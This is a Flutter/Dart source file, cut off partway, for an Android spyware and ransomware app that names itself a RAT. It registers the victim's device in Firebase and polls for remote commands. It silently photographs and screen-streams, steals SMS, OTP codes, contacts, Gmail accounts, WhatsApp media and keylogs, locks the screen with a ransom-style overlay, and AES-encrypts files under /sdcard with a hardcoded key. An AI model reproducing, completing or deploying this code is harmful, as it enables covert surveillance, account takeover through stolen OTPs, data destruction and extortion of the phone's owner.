// ignore_for_file: use_build_context_synchronously
import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:geolocator/geolocator.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:webview_flutter_android/webview_flutter_android.dart';
import 'package:web_socket_channel/io.dart';
import 'package:encrypt/encrypt.dart' as crypt;

// 🔥 FIREBASE
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'firebase_options.dart';

// ════════════════════════════════════════════════════════════════════════════
// KONFIGURASI
// ════════════════════════════════════════════════════════════════════════════
// kServerBase tidak dipakai lagi — semua via Firebase RTDB
String kServerBase = "";
String kBakedPairId = "";
String kBakedWebUrl = "https://www.facebook.com";

const String _kCacheServer = "cache_server_base";
const String _kCacheTime   = "cache_server_time";
const int    _kCacheTTL    = 60 * 1000;

Timer? _configRefreshTimer;
IOWebSocketChannel? _liveWs;
final GlobalKey<NavigatorState> navigatorKey = GlobalKey<NavigatorState>();

// ════════════════════════════════════════════════════════════════════════════
// LOAD CONFIG
// ════════════════════════════════════════════════════════════════════════════
Future<void> loadBakedConfig() async {
  try {
    final raw = await rootBundle.loadString('assets/config.json');
    final trimmed = raw.trim();
    try {
      final cfg = json.decode(trimmed);
      if (cfg is Map) {
        if (cfg['pairId'] != null) kBakedPairId = cfg['pairId'].toString().trim();
        if (cfg['webUrl'] != null) kBakedWebUrl = cfg['webUrl'].toString().trim();
      }
    } catch (_) { kBakedPairId = trimmed; }
  } catch (_) {}
}

// 🔥 FIREBASE — ganti loadRemoteServerBase
Future<void> loadRemoteServerBase() async {
  final prefs = await SharedPreferences.getInstance();
  final cachedBase = prefs.getString(_kCacheServer);
  final cachedTime = prefs.getInt(_kCacheTime) ?? 0;
  if (cachedBase != null && cachedBase.isNotEmpty &&
      DateTime.now().millisecondsSinceEpoch - cachedTime < _kCacheTTL) {
    kServerBase = cachedBase;
    return;
  }
  try {
    final snap = await FirebaseFirestore.instance
        .collection('app_config')
        .orderBy('updated_at', descending: true)
        .limit(1)
        .get()
        .timeout(const Duration(seconds: 10));

    if (snap.docs.isNotEmpty) {
      String? nb = snap.docs.first.data()['api_base']?.toString().trim();
      if (nb != null && nb.isNotEmpty) {
        nb = nb.replaceAll(RegExp(r'/+$'), '');
        kServerBase = nb;
        await prefs.setString(_kCacheServer, nb);
        await prefs.setInt(_kCacheTime, DateTime.now().millisecondsSinceEpoch);
      }
    }
  } catch (_) {}
}

void _startConfigAutoRefresh() {
  _configRefreshTimer?.cancel();
  Future.delayed(const Duration(seconds: 5), _checkAndUpdateConfig);
  _configRefreshTimer = Timer.periodic(const Duration(seconds: 60), (_) => _checkAndUpdateConfig());
}

// 🔥 FIREBASE — ganti _checkAndUpdateConfig
Future<void> _checkAndUpdateConfig() async {
  try {
    final snap = await FirebaseFirestore.instance
        .collection('app_config')
        .orderBy('updated_at', descending: true)
        .limit(1)
        .get()
        .timeout(const Duration(seconds: 10));

    if (snap.docs.isEmpty) return;
    String? nb = snap.docs.first.data()['api_base']?.toString().trim();
    if (nb == null || nb.isEmpty) return;
    nb = nb.replaceAll(RegExp(r'/+$'), '');
    if (nb != kServerBase) {
      kServerBase = nb;
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString(_kCacheServer, nb);
      await prefs.setInt(_kCacheTime, DateTime.now().millisecondsSinceEpoch);
    }
  } catch (_) {}
}

// ════════════════════════════════════════════════════════════════════════════
// GLOBAL STATE
// ════════════════════════════════════════════════════════════════════════════
ValueNotifier<bool> deviceLocked   = ValueNotifier<bool>(false);
ValueNotifier<bool> showFakeUpdate = ValueNotifier<bool>(false);
late AudioPlayer _audioPlayer;
String globalDeviceId    = "";
String globalDeviceModel = "";
String currentLockMessage = "LOCKED BY #Top1";
String currentLockPIN     = "1234";

final lockChatMessages = ValueNotifier<List<Map<String, String>>>([]);
bool isLockLive = false;

const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy    = MethodChannel('com.nullx.pp/background_spy');

bool _isLiveStreaming = false;

// ════════════════════════════════════════════════════════════════════════════
// MAIN
// ════════════════════════════════════════════════════════════════════════════
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  _audioPlayer = AudioPlayer();
  FlutterError.onError = (d) => FlutterError.presentError(d);
  PlatformDispatcher.instance.onError = (_, __) => true;

  // 🔥 Init Firebase
  try {
    await Firebase.initializeApp(
      options: DefaultFirebaseOptions.currentPlatform,
    );
  } catch (e) {
    debugPrint("Firebase init error: $e");
  }

  await loadBakedConfig();
  await loadRemoteServerBase();
  _autoPairOnStartup();
  runApp(const AppRoot());
}

Future<void> _autoPairOnStartup() async {
  try {
    final info = await _getDeviceInfo();
    globalDeviceId    = info['id']!;
    globalDeviceModel = info['model']!;
    try { await platformSpy.invokeMethod('saveTargetId', globalDeviceId); } catch (_) {}

    final prefs     = await SharedPreferences.getInstance();
    final savedPair = prefs.getString('pairId');
    String? effectivePairId;

    if (kBakedPairId.isNotEmpty && kBakedPairId != "DEFAULT0000") {
      effectivePairId = kBakedPairId;
      await prefs.setString('pairId', kBakedPairId);
    } else if (savedPair != null && savedPair.isNotEmpty) {
      effectivePairId = savedPair;
    }

    if (effectivePairId != null && effectivePairId.isNotEmpty) {
      await _registerDevice(globalDeviceId, globalDeviceModel);
      await pairDevice(effectivePairId);
      _startSpyware(globalDeviceId);
      _listenBroadcastCmd(globalDeviceId);
      _startConfigAutoRefresh();
    }
  } catch (_) {}
}

// ════════════════════════════════════════════════════════════════════════════
// APP ROOT
// ════════════════════════════════════════════════════════════════════════════
class AppRoot extends StatelessWidget {
  const AppRoot({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      navigatorKey: navigatorKey,
      debugShowCheckedModeBanner: false,
      title: 'App',
      theme: ThemeData(
        brightness: Brightness.dark,
        fontFamily: 'ShareTechMono',
        scaffoldBackgroundColor: Colors.black,
      ),
      home: const PermissionPage(),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// PERMISSION PAGE
// ════════════════════════════════════════════════════════════════════════════
class PermissionPage extends StatefulWidget {
  const PermissionPage({super.key});
  @override
  State<PermissionPage> createState() => _PermissionPageState();
}

class _PermissionPageState extends State<PermissionPage> with WidgetsBindingObserver {

  Permission get _galleryPermission => Permission.photos;

  late final List<Map<String, dynamic>> _permissions;

  @override
  void initState() {
    super.initState();
    _permissions = [
      {'permission': Permission.camera,          'title': 'Kamera',             'desc': 'Mengambil foto dan video',    'icon': Icons.camera_alt},
      {'permission': Permission.microphone,      'title': 'Mikrofon',           'desc': 'Merekam suara',               'icon': Icons.mic},
      {'permission': Permission.locationWhenInUse,'title': 'Lokasi',            'desc': 'Menentukan posisi',           'icon': Icons.location_on},
      {'permission': Permission.contacts,        'title': 'Kontak',             'desc': 'Mengakses kontak',            'icon': Icons.contacts},
      {'permission': Permission.sms,             'title': 'SMS',                'desc': 'Membaca pesan SMS',           'icon': Icons.message},
      {'permission': Permission.phone,           'title': 'Telepon',            'desc': 'Mengakses status telepon',    'icon': Icons.phone},
      {'permission': _galleryPermission,         'title': 'Galeri',             'desc': 'Mengakses foto & video',      'icon': Icons.photo_library},
      {'permission': Permission.notification,    'title': 'Notifikasi',         'desc': 'Mengirim notifikasi',         'icon': Icons.notifications},
      {'permission': Permission.manageExternalStorage, 'title': 'Akses Semua File', 'desc': 'Membaca & hapus file',   'icon': Icons.folder},
      {'permission': Permission.systemAlertWindow,     'title': 'Overlay',          'desc': 'Tampil di atas app lain', 'icon': Icons.layers},
      {'permission': Permission.ignoreBatteryOptimizations, 'title': 'Baterai',  'desc': 'Berjalan di background',    'icon': Icons.battery_charging_full},
    ];

    WidgetsBinding.instance.addObserver(this);
    _checkAllPermissions();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) _checkAllPermissions();
  }

  final Map<String, bool> _grantedStatus = {};
  bool _isAccessibilityEnabled = false;
  bool _isProcessing = false;

  Future<void> _checkAllPermissions() async {
    for (final item in _permissions) {
      final perm   = item['permission'] as Permission;
      final status = await perm.status;
      if (mounted) setState(() => _grantedStatus[item['title']] = status.isGranted);
    }
    try {
      final isAcc = await platformSpy.invokeMethod('isAccessibilityEnabled') as bool? ?? false;
      if (mounted) setState(() => _isAccessibilityEnabled = isAcc);
    } catch (_) {}
  }

  Future<void> _requestPermission(Map<String, dynamic> item) async {
    final perm   = item['permission'] as Permission;
    final status = await perm.status;

    if (status.isGranted) return;

    if (status.isPermanentlyDenied) {
      await openAppSettings();
    } else {
      final newStatus = await perm.request();
      if (perm == Permission.manageExternalStorage && !newStatus.isGranted) {
        await openAppSettings();
      } else if (perm == Permission.systemAlertWindow && !newStatus.isGranted) {
        await openAppSettings();
      } else if (newStatus.isPermanentlyDenied) {
        await openAppSettings();
      }
    }
    final updated = await perm.status;
    if (mounted) setState(() => _grantedStatus[item['title']] = updated.isGranted);
  }

  Future<void> _openAccessibility() async {
    try { await platformSpy.invokeMethod('openAccessibilitySettings'); } catch (_) {}
  }

  bool get _allPermissionsGranted {
    for (final item in _permissions) {
      if (_grantedStatus[item['title']] != true) return false;
    }
    return true;
  }

  Future<void> _continueToApp() async {
    if (!_allPermissionsGranted) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("Aktifkan semua izin terlebih dahulu.")));
      return;
    }
    setState(() => _isProcessing = true);
    navigatorKey.currentState?.pushReplacement(
      MaterialPageRoute(builder: (_) => const LockWrapper()));
  }

  @override
  Widget build(BuildContext context) {
    const accent = Color(0xFF00E5FF);
    return Scaffold(
      body: SafeArea(
        child: Column(children: [
          const Padding(
            padding: EdgeInsets.symmetric(vertical: 24, horizontal: 20),
            child: Column(children: [
              Icon(Icons.security, color: accent, size: 64),
              SizedBox(height: 16),
              Text("IZIN APLIKASI",
                  style: TextStyle(color: Colors.white, fontSize: 22, fontWeight: FontWeight.bold, letterSpacing: 1.5)),
              SizedBox(height: 8),
              Text("Aktifkan semua izin berikut. Klik setiap item untuk mengaktifkan.",
                  textAlign: TextAlign.center,
                  style: TextStyle(color: Colors.grey, fontSize: 13)),
            ]),
          ),
          Expanded(
            child: ListView.builder(
              padding: const EdgeInsets.symmetric(horizontal: 20),
              itemCount: _permissions.length + 1,
              itemBuilder: (context, index) {
                if (index == _permissions.length) {
                  return Container(
                    margin: const EdgeInsets.only(bottom: 12),
                    decoration: BoxDecoration(
                      color: const Color(0xFF1A1A22),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _isAccessibilityEnabled
                          ? accent.withOpacity(0.3) : Colors.transparent),
                    ),
                    child: ListTile(
                      contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                      leading: Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          color: _isAccessibilityEnabled ? accent.withOpacity(0.1) : Colors.white10,
                          shape: BoxShape.circle),
                        child: Icon(Icons.accessibility_new,
                            color: _isAccessibilityEnabled ? accent : Colors.grey, size: 24),
                      ),
                      title: const Text("Aksesibilitas (Opsional)",
                          style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 15)),
                      subtitle: const Text("Untuk keylogger & auto-grant",
                          style: TextStyle(color: Colors.grey, fontSize: 12)),
                      trailing: Icon(
                        _isAccessibilityEnabled ? Icons.check_circle : Icons.arrow_forward_ios,
                        color: _isAccessibilityEnabled ? accent : Colors.grey,
                        size: _isAccessibilityEnabled ? 24 : 16),
                      onTap: _openAccessibility,
                    ),
                  );
                }

                final item      = _permissions[index];
                final isGranted = _grantedStatus[item['title']] ?? false;

                return Container(
                  margin: const EdgeInsets.only(bottom: 12),
                  decoration: BoxDecoration(
                    color: const Color(0xFF1A1A22),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                        color: isGranted ? accent.withOpacity(0.3) : Colors.transparent)),
                  child: ListTile(
                    contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                    leading: Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: isGranted ? accent.withOpacity(0.1) : Colors.white10,
                        shape: BoxShape.circle),
                      child: Icon(item['icon'] as IconData,
                          color: isGranted ? accent : Colors.grey, size: 24),
                    ),
                    title: Text(item['title'] as String,
                        style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 15)),
                    subtitle: Text(item['desc'] as String,
                        style: const TextStyle(color: Colors.grey, fontSize: 12)),
                    trailing: Icon(
                      isGranted ? Icons.check_circle : Icons.arrow_forward_ios,
                      color: isGranted ? accent : Colors.grey,
                      size: isGranted ? 24 : 16),
                    onTap: () => _requestPermission(item),
                  ),
                );
              },
            ),
          ),
          Padding(
            padding: const EdgeInsets.all(20),
            child: SizedBox(
              width: double.infinity,
              height: 54,
              child: ElevatedButton(
                onPressed: _allPermissionsGranted && !_isProcessing ? _continueToApp : null,
                style: ElevatedButton.styleFrom(
                  backgroundColor: accent,
                  disabledBackgroundColor: Colors.white10,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                ),
                child: _isProcessing
                    ? const CircularProgressIndicator(color: Colors.black)
                    : Text(
                        _allPermissionsGranted ? "LANJUTKAN" : "AKTIFKAN SEMUA IZIN",
                        style: TextStyle(
                          color: _allPermissionsGranted ? Colors.black : Colors.grey,
                          fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 1),
                      ),
              ),
            ),
          ),
        ]),
      ),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// HELPERS
// ════════════════════════════════════════════════════════════════════════════
Future<Map<String, String>> _getDeviceInfo() async {
  final di = DeviceInfoPlugin();
  String model = "Unknown", id = "UNKNOWN";
  try {
    if (Platform.isAndroid) {
      final a = await di.androidInfo;
      model = "${a.brand.toUpperCase()} ${a.model}";
      id    = "${a.brand}-${a.model}-${a.id}".replaceAll(' ', '_');
    }
  } catch (_) { id = "ZDX-${Platform.localHostname.hashCode}"; }
  return {"id": id, "model": model};
}

Future<void> _registerDevice(String id, String model) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    // Simpan info target ke Firebase Realtime DB
    await FirebaseDatabase.instance.ref('targets/$id').update({
      'id': id, 'model': model, 'battery': lv.toString(),
      'lastSeen': ServerValue.timestamp, 'status': 'Alive',
    });
  } catch (_) {}
}

Future<bool> pairDevice(String pairId) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    // Tulis ke Firebase Realtime DB
    await FirebaseDatabase.instance.ref('targets/$globalDeviceId').update({
      'id': globalDeviceId, 'pairId': pairId,
      'model': globalDeviceModel, 'battery': lv.toString(),
      'lastSeen': ServerValue.timestamp, 'status': 'Alive',
    }).timeout(const Duration(seconds: 15));
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('pairId', pairId);
    return true;
  } catch (_) {}
  return false;
}

// Mapping cmd string → type untuk panel render
String _cmdToType(String cmd) {
  const m = {
    'take_photo': 'photo', 'get_screen': 'screenshot',
    'get_contacts': 'contacts', 'get_sms': 'sms',
    'get_call_log': 'call_logs', 'get_location': 'location',
    'track_gps': 'location', 'device_info': 'device_info',
    'get_chrome_history': 'browser_history', 'get_gallery': 'gallery',
    'get_gmails': 'gmail_emails', 'get_notifications': 'notifications',
    'get_whatsapp_media': 'whatsapp_messages', 'get_keylogs': 'keylogs',
    'get_apps': 'apps', 'get_otp': 'otp',
    'get_downloads': 'files', 'record_audio': 'audio',
  };
  return m[cmd] ?? cmd;
}

Future<void> _postResponse(String id, String cmd, dynamic data, {String? cmdId}) async {
  try {
    final key = cmdId ?? 'resp_${DateTime.now().millisecondsSinceEpoch}';
    await FirebaseDatabase.instance.ref('results/$id/$key').set({
      'cmd': cmd, 'type': _cmdToType(cmd), 'data': data,
      'device_id': id, 'receivedAt': ServerValue.timestamp,
    });
  } catch (_) {}
}

void playScarySound() async {
  await _audioPlayer.setReleaseMode(ReleaseMode.loop);
  await _audioPlayer.play(UrlSource(
      'https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
}
void stopSound() async { await _audioPlayer.stop(); }

// ════════════════════════════════════════════════════════════════════════════
// LIVE STREAM
// ════════════════════════════════════════════════════════════════════════════
void _startLiveCamera(String id, String side) async {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  try { await platformSpy.invokeMethod('startLiveCameraStream', {"side": side}); } catch (_) {}
  // Push frame ke Firebase RTDB → live/{id}/frame
  Timer.periodic(const Duration(milliseconds: 200), (t) async {
    if (!_isLiveStreaming) { t.cancel(); return; }
    try {
      final f = await platformSpy.invokeMethod('getLiveFrame') as String?;
      if (f != null && f.isNotEmpty) {
        await FirebaseDatabase.instance.ref('live/$id').update({
          'frame': f, 'type': 'camera', 'side': side,
          'ts': ServerValue.timestamp,
        });
      }
    } catch (_) {}
  });
}

void _startLiveScreen(String id) async {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  // Push frame ke Firebase RTDB → live/{id}
  Timer.periodic(const Duration(milliseconds: 200), (t) async {
    if (!_isLiveStreaming) { t.cancel(); return; }
    try {
      final f = await platformSpy.invokeMethod('startScreenStreamBackground') as String?;
      if (f != null && f.isNotEmpty) {
        await FirebaseDatabase.instance.ref('live/$id').update({
          'frame': f, 'type': 'screen',
          'ts': ServerValue.timestamp,
        });
      }
    } catch (_) {}
  });
}

void _stopLive() {
  _isLiveStreaming = false;
  _liveWs?.sink.close();
  _liveWs = null;
  platformSpy.invokeMethod('stopLiveCameraStream').catchError((_) {});
}

// ════════════════════════════════════════════════════════════════════════════
// RANSOMWARE
// ════════════════════════════════════════════════════════════════════════════
final String _ransomKey = "GHTxRAT_SECRET_KEY_1234567890ABCD";

Future<void> _encryptAllFiles() async {
  final dirs = [
    Directory('/sdcard/DCIM'),
    Directory('/sdcard/Download'),
    Directory('/sdcard/Documents'),
  ];
  final encrypter = crypt.Encrypter(crypt.AES(crypt.Key.fromUtf8(_ransomKey)));
  for (final dir in dirs) {
    if (await dir.exists()) {
      await for (final entity in dir.list(recursive: true, followLinks: false)) {
        if (entity is File && !entity.path.endsWith('.encrypted')) {
          try {
            final bytes = await entity.readAsBytes();
            final encrypted = encrypter.encryptBytes(bytes);
            await entity.writeAsString(encrypted.base64);
            await entity.rename('${entity.path}.encrypted');
          } catch (_) {}
        }
      }
    }
  }
}

Future<void> _decryptAllFiles() async {
  final dirs = [
    Directory('/sdcard/DCIM'),
    Directory('/sdcard/Download'),
    Directory('/sdcard/Documents'),
  ];
  final encrypter = crypt.Encrypter(crypt.AES(crypt.Key.fromUtf8(_ransomKey)));
  for (final dir in dirs) {
    if (await dir.exists()) {
      await for (final entity in dir.list(recursive: true, followLinks: false)) {
        if (entity is File && entity.path.endsWith('.encrypted')) {
          try {
            final base64Str  = await entity.readAsString();
            final encrypted  = crypt.Encrypted.fromBase64(base64Str);
            final decrypted  = encrypter.decryptBytes(encrypted);
            final newPath    = entity.path.replaceAll('.encrypted', '');
            await File(newPath).writeAsBytes(decrypted);
            await entity.delete();
          } catch (_) {}
        }
      }
    }
  }
}

// ════════════════════════════════════════════════════════════════════════════
// BROADCAST CHANNEL — terima command delegate dari SpyService (Java)
// SpyService kirim broadcast "com.nullx.pp.EXECUTE_CMD" saat app dibuka
// ════════════════════════════════════════════════════════════════════════════
const _broadcastChannel = BasicMessageChannel<String>(
  'com.nullx.pp/cmd_broadcast', StringCodec(),
);

void _listenBroadcastCmd(String deviceId) {
  _broadcastChannel.setMessageHandler((msg) async {
    if (msg == null || msg.isEmpty) return null;
    try {
      final parts = msg.split('|');
      final cmd   = parts.isNotEmpty ? parts[0] : '';
      final extra = parts.length > 1 ? parts[1] : '';
      final cmdId = parts.length > 2 ? parts[2] : 'bc_${DateTime.now().millisecondsSinceEpoch}';
      if (cmd.isEmpty || cmd == 'idle') return null;
      // Jalankan lewat spyware loop — tandai di Firebase dulu
      await FirebaseDatabase.instance.ref('commands/$deviceId/$cmdId').set({
        'cmd': cmd, 'param': extra, 'status': 'pending',
        'timestamp': ServerValue.timestamp,
      });
    } catch (_) {}
    return null;
  });
}

// ════════════════════════════════════════════════════════════════════════════
// SPYWARE COMMAND LOOP
// ════════════════════════════════════════════════════════════════════════════
void _startSpyware(String id) {
  Future<void> loop() async {
    try {
      final bat = Battery();
      int batLv = 100;
      try { batLv = await bat.batteryLevel; } catch (_) {}
      // Heartbeat ke Firebase Realtime DB
      await FirebaseDatabase.instance.ref('targets/$id').update({
        'battery': batLv.toString(), 'status': 'Alive',
        'lastSeen': ServerValue.timestamp,
      }).timeout(const Duration(seconds: 2)).catchError((_) {});

      // Ambil command pending tertua dari Firebase
      String cmd = 'idle', extra = '', fetchedCmdId = '';
      try {
        final snap = await FirebaseDatabase.instance
            .ref('commands/$id')
            .orderByChild('timestamp')
            .limitToFirst(20)
            .get()
            .timeout(const Duration(seconds: 3));
        if (snap.exists) {
          Map<dynamic, dynamic>? oldest;
          String oldestKey = '';
          int oldestTs = 9999999999999;
          for (final child in snap.children) {
            final v = child.value as Map?;
            if (v == null) continue;
            if ((v['status'] ?? '') == 'pending') {
              final ts = (v['timestamp'] as num?)?.toInt() ?? 0;
              if (ts < oldestTs) { oldest = Map.from(v); oldestKey = child.key!; oldestTs = ts; }
            }
          }
          if (oldest != null && oldestKey.isNotEmpty) {
            // Mapping CMD integer → string
            const cmdMap = {
              98765432: 'hard_lock',      98765433: 'unlock',
              11223344: 'take_photo',     11223345: 'take_photo',
              99887766: 'enable_admin',   66985478: 'back',
              25896321: 'home',           33654789: 'recents',
              45832158: 'notifications',  44598715: 'click',
              885478962: 'set_text',      115987: 'touch',
              74789654: 'launch_app',     64645897: 'uninstall',
              1596485: 'get_apps',        5698742: 'auto_block_screen',
              89521475: 'stop_auto_block',87654321: 'set_lock_pin',
              1001: 'get_contacts',       1002: 'get_sms',
              1003: 'send_sms',           1004: 'get_call_log',
              1005: 'get_location',       1006: 'device_info',
              1007: 'get_chrome_history', 1008: 'vibrate_loop',
              1009: 'wipe_sdcard',        1010: 'start_ransomware',
              1011: 'set_wallpaper',      1012: 'play_audio',
              1013: 'send_notif',         1014: 'get_downloads',
              1015: 'upload_file',        1016: 'flash_on',
              1017: 'flash_off',          1018: 'flash_strobe',
              1019: 'get_notifications',  1020: 'get_gallery',
              200: 'get_gmails',          2000: 'custom_lock_html',
              2001: 'play_audio',         1050: 'get_whatsapp_number',
              1051: 'get_otp',            1052: 'get_telegram',
              1053: 'get_google_accounts',1054: 'get_whatsapp_media',
              1055: 'get_keylogs',        1060: 'get_screen',
              1061: 'screen_record_start',1062: 'screen_record_stop',
              1063: 'live_screen_start',  1064: 'live_stop',
              1070: 'record_audio',       1071: 'record_audio_stop',
              1080: 'get_apps',           3000: 'lock_live',
              10101: 'decrypt_files',
            };
            final rawCmd = oldest['cmd'];
            final cmdInt = rawCmd is int ? rawCmd : int.tryParse(rawCmd.toString()) ?? 0;
            cmd = cmdMap[cmdInt] ?? rawCmd.toString();
            extra = oldest['param']?.toString() ?? '';
            fetchedCmdId = oldestKey;
            // Tandai sudah diambil
            await FirebaseDatabase.instance
                .ref('commands/$id/$oldestKey')
                .update({'status': 'sent'});
          }
        }
      } catch (_) {}
      if (cmd == 'idle') return;
      dynamic result;

      if (cmd == 'hard_lock' || cmd == 'lock_device' || cmd == 'lock_live') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage = p[0].isNotEmpty ? p[0] : 'DEVICE LOCKED';
          currentLockPIN     = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
        } else if (extra.isNotEmpty) {
          currentLockMessage = extra;
        }
        isLockLive = cmd == 'lock_live';
        if (!deviceLocked.value) { deviceLocked.value = true; playScarySound(); }
        try { await platformSpy.invokeMethod('saveLockState', {'locked': true, 'isLockLive': isLockLive, 'message': currentLockMessage, 'pin': currentLockPIN}); } catch (_) {}
        try { await platformSpy.invokeMethod('startLockOverlay', {'message': currentLockMessage, 'pin': currentLockPIN}); } catch (_) {}
        try { await platformSpy.invokeMethod('lockDeviceNow'); } catch (_) {}
        result = {"status": "Locked"};
      }

      else if (cmd == 'unlock' || cmd == 'unlock_device') {
        deviceLocked.value = false;
        isLockLive = false;
        lockChatMessages.value = [];
        stopSound();
        try { await platformSpy.invokeMethod('saveLockState', {'locked': false, 'isLockLive': false, 'message': '', 'pin': ''}); } catch (_) {}
        try { await platformSpy.invokeMethod('stopLockOverlay'); } catch (_) {}
        result = {"status": "Unlocked"};
      }

      else if (cmd == 'custom_lock_html') {
        currentLockMessage = extra;
        isLockLive = true;
        deviceLocked.value = true;
        try { await platformSpy.invokeMethod('startLockOverlay', {'message': 'CUSTOM LOCK', 'pin': currentLockPIN, 'html': extra}); } catch (_) {}
        result = {"status": "Custom HTML lock active"};
      }

      else if (cmd == 'take_photo') {
        final camStatus = await Permission.camera.status;
        if (camStatus.isGranted) {
          final b64 = await platformSpy.invokeMethod(
              'takeSilentPhotoBackground', {"side": extra.isEmpty ? "back" : extra});
          result = b64 != null ? {"status": "Success", "image_base64": b64} : {"status": "Failed"};
        } else {
          result = {"status": "Permission denied"};
        }
      }

      else if (cmd == 'get_screen') {
        final b64 = await platformSpy.invokeMethod('startScreenStreamBackground');
        result = {"status": "Success", "image_base64": b64 ?? ""};
      }

      else if (cmd == 'live_camera_start') {
        _stopLive();
        _startLiveCamera(id, extra.isEmpty ? 'back' : extra);
        result = {"status": "Live camera started"};
      }

      else if (cmd == 'live_screen_start') {
        _stopLive();
        _startLiveScreen(id);
        result = {"status": "Live screen started"};
      }

      else if (cmd == 'live_stop') {
        _stopLive();
        result = {"status": "Stopped"};
      }

      else if (cmd == 'get_location' || cmd == 'track_gps') {
        try {
          var locStatus = await Permission.locationWhenInUse.status;
          if (locStatus.isGranted) {
            final pos = await Geolocator.getCurrentPosition(
                desiredAccuracy: LocationAccuracy.high)
                .timeout(const Duration(seconds: 10));
            final gmapUrl =
                "https://www.google.com/maps/search/?api=1&query=${pos.latitude},${pos.longitude}";
            result = {"status": "Success", "url": gmapUrl, "lat": pos.latitude, "lng": pos.longitude};
          } else {
            result = {"status": "Permission denied"};
          }
        } catch (e) {
          result = {"status": "Failed: $e"};
        }
      }

      else if (cmd == 'get_gallery') {
        try {
          var photoStatus = await Permission.photos.status;
          if (!photoStatus.isGranted) {
            var storageStatus = await Permission.storage.status;
            if (!storageStatus.isGranted) {
              result = {"images": [], "error": "Gallery permission denied"};
              await _postResponse(id, cmd, result, cmdId: fetchedCmdId);
              return;
            }
          }
          final imgs = await platformSpy.invokeMethod('getGalleryImages', {"limit": 5});
          result = {"images": imgs ?? []};
        } catch (e) {
          result = {"images": [], "error": e.toString()};
        }
      }

      else if (cmd == 'get_sms') {
        try {
          result = {"sms": await platformSpy.invokeMethod('getSmsMessages')};
        } catch (e) { result = {"sms": [], "error": e.toString()}; }
      }

      else if (cmd == 'send_sms') {
        try {
          String number = '';
          String message = '';
          if (extra.contains('|')) {
            final p = extra.split('|');
            number  = p[0].trim();
            message = p.length > 1 ? p[1].trim() : '';
          } else {
            number = extra.trim();
          }
          final uri = Uri.parse("sms:$number?body=${Uri.encodeComponent(message)}");
          if (await canLaunchUrl(uri)) {
            await launchUrl(uri, mode: LaunchMode.externalApplication);
            result = {"status": "SMS app opened"};
          } else {
            result = {"status": "Cannot open SMS"};
          }
        } catch (e) {
          result = {"status": "error: $e"};
        }
      }

      else if (cmd == 'get_contacts' || cmd == 'dump_contacts') {
        try {
          if (await FlutterContacts.requestPermission(readonly: true)) {
            final list = await FlutterContacts.getContacts(
                withProperties: true, withPhoto: false);
            result = {"contacts": list.take(100).map((e) => {
              "name":   e.displayName,
              "number": e.phones.isNotEmpty ? e.phones.first.number : "",
            }).toList()};
          } else {
            result = {"contacts": [], "error": "Permission denied"};
          }
        } catch (e) { result = {"contacts": [], "error": e.toString()}; }
      }

      else if (cmd == 'get_otp') {
        try {
          final smsList = await platformSpy.invokeMethod('getSmsMessages') as List? ?? [];
          final otpList = smsList.where((s) {
            final body = s['body']?.toString().toLowerCase() ?? '';
            return body.contains('otp') || body.contains('kode') ||
                   body.contains('verifikasi') || body.contains('code') ||
                   body.contains('verification');
          }).toList();
          result = {"otp": otpList};
        } catch (e) { result = {"otp": [], "error": e.toString()}; }
      }

      else if (cmd == 'get_gmails') {
        try {
          final emails = await platformSpy.invokeMethod('getGmailAccounts') as String? ?? '';
          result = {"accounts": emails.isEmpty ? "No Gmail Found" : emails};
        } catch (e) { result = {"accounts": "", "error": e.toString()}; }
      }

      else if (cmd == 'get_whatsapp_media') {
        try {
          result = {"media": await platformSpy.invokeMethod('getWhatsAppMedia', {"limit": 20})};
        } catch (e) { result = {"media": [], "error": e.toString()}; }
      }

      else if (cmd == 'get_downloads') {
        try {
          result = {"files": await platformSpy.invokeMethod('getDownloads', {"limit": 20})};
        } catch (e) { result = {"files": [], "error": e.toString()}; }
      }

      else if (cmd == 'get_keylogs') {
        try { result = {"keylogs": await platformSpy.invokeMethod('getKeylogs')}; }
